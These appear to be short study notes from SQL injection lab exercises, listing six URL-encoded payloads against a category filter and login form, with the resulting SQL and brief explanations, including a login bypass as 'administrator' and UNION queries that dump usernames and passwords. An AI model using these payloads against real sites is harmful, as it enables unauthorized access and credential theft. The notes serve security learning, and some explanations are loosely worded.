1. 
    /filter?category=%27+OR+1=1--

        ```sql
        SELECT * FROM categories WHERE name = OR 1=1 --'
        ```

        It worked because the website didn't validate the input.

2.

    administrator'--

        ```sql
        SELECT * FROM users WHERE username = 'administrator' --'
        ```

        We are pulling the creds from the administrator user


3.
    /filter?category=%27+UNION+SELECT+username,+password+FROM+users--

        ```sql
        SELECT * FROM categories WHERE name = '' UNION SELECT username, password FROM users --'
        ```
        
        It worked because we know that users table existd.


4.
    /filter?category=%27UNION+SELECT+NULL,NULL,NULL--

        ```sql
        SELECT * FROM categories WHERE name = '' UNION SELECT NULL,NULL,NULL --'
        ```

    

5.
    /filter?category=%27+UNION+SELECT+NULL,%27BmB3ZV%27,NULL--

        ```sql
        SELECT * FROM categories WHERE name = '' UNION SELECT NULL, 'BmB3ZV', NULL --'
        ```

        because the seconde row was a string value


6.
    filter?category=%27+UNION+SELECT+NULL,username||%27%27||password+FROM+users--

    ```sql
    SELECT * FROM categories WHERE name = '' UNION SELECT NULL, username || '' || password FROM users --'
    ```
    UNION combined categories and the users table, and then display it.
    
